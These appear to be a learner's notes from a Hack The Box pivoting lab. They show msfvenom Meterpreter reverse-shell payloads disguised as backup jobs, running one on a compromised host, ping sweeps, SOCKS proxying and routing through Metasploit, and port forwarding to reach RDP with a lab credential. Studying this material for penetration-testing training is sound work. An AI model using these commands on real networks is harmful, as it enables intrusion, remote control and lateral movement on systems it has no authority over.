#### Creating Payload for Ubuntu Pivot Host

```shell
3kjS@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
#### Configuring & Starting the multi/handler
![[Screenshot 2026-05-18 at 18.04.37.png]]
#### Executing the Payload on the Pivot Host

```shell
ubuntu@WebServer:~$ ls 

backupjob 
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```
#### Meterpreter Session Establishment

```shell
[*] Sending stage (3020772 bytes) to 10.129.202.64 
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500 
meterpreter > pwd 

/home/ubuntu
```
#### Ping Sweep

```shell
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 

[*] Performing ping sweep for IP range 172.16.5.0/23
```
#### Ping Sweep For Loop on Linux Pivot Hosts

```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
#### Ping Sweep For Loop Using CMD

```shell
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
#### Ping Sweep Using PowerShell

```shell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```
#### Configuring MSF's SOCKS Proxy
![[Screenshot 2026-05-18 at 18.16.38.png]]
#### Confirming Proxy Server is Running
![[Screenshot 2026-05-18 at 18.17.21.png]]
#### Adding a Line to proxychains.conf if Needed

```shell
socks4 127.0.0.1 9050
```
#### Creating Routes with AutoRoute
![[Screenshot 2026-05-18 at 18.18.17.png]]
It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
![[Screenshot 2026-05-18 at 18.18.34.png]]
#### Listing Active Routes with AutoRoute
![[Screenshot 2026-05-18 at 18.19.06.png]]
#### Testing Proxy & Routing Functionality

```shell
3kjS@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
## Port Forwarding
#### Portfwd options
![[Screenshot 2026-05-18 at 18.20.01.png]]
#### Creating Local TCP Relay

```shell
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19 
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
#### Connecting to Windows Target through localhost

```shell
3kjS@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
#### Netstat Output
![[Screenshot 2026-05-18 at 18.21.28.png]]
## Meterpreter Reverse Port Forwarding
#### Reverse Port Forwarding Rules

```shell
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 
[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```
#### Configuring & Starting multi/handler
![[Screenshot 2026-05-18 at 18.22.16.png]]
#### Generating the Windows Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
#### Establishing the Meterpreter session
![[Screenshot 2026-05-18 at 18.24.39.png]]
